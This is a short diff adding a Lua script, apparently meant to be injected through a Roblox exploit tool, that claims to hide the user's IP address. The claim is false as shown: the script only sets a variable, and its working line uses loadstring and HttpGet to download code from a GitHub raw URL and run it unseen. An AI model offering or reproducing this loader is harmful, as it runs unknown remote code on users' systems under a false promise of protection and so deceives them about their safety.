@@ -1,0 +1,5 @@
+-- ty guizzy for github but yuh fake ip gngo inject this if ur a pussyo
+spoofedIP = "52.183.160.93" -- your fake ip you can chnage it to whatever u want enjoy
+-- this makes so when someone trys to log ur ip with a lua script it will change ur ip so  udont get leaked
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/HelloLua/main/looferrlua", true))()
